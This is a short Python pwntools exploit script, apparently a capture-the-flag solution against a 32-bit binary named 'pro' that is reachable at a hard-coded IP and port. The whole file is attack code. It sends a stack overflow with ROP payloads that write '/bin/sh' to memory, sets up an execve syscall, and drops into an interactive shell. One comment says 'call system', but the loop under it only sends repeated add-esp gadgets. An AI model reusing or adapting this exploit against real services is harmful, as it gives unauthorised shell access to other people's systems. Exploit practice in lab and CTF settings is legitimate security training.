# -*- coding: utf-8 -*-

from pwn import *
import time

pwnable_filename = "./pro"
pwnable = ELF(pwnable_filename)

Io = remote("192.168.210.11", 10013)
Io = process(pwnable_filename)

gdb.attach(proc.pidof(Io)[0], gdbscript='')

output_addr = 0x080480F9
input_addr = 0x080480E1
start_addr = 0x080480B8
base_addr = 0x08048000

stack_addr = 0xff928000

add_esp_20_ret_addr = 0x0804817C
set_ebcdx_addr = 0x080480FE

stdout = 0x01
stdin = 0x00

junk_size = 0x10
junk = junk_size * "A"

read_id = 0x03
write_id = 0x04
execve_id = 0x0b

# Step 1. write /bin/sh to memory

call_read_addr = 0x08048138
address_vuln = 0x80480e6


payload = flat([
    junk,
    p32(input_addr),
    p32(start_addr),
    p32(stdin),
    p32(stack_addr),
    p32(0x0b),
    "/bin////sh\x00",
])
print "[+] Payload => %r" % (payload)
Io.send(payload)
time.sleep(1)


for i in range(0x100):
    # Step 2. call system
    payload = flat([
        junk,
        p32(add_esp_20_ret_addr),
        p32(add_esp_20_ret_addr),
        p32(add_esp_20_ret_addr),
        p32(add_esp_20_ret_addr),
        p32(add_esp_20_ret_addr),
    ])
    Io.send(payload)
    time.sleep(0.02)



Io.interactive()
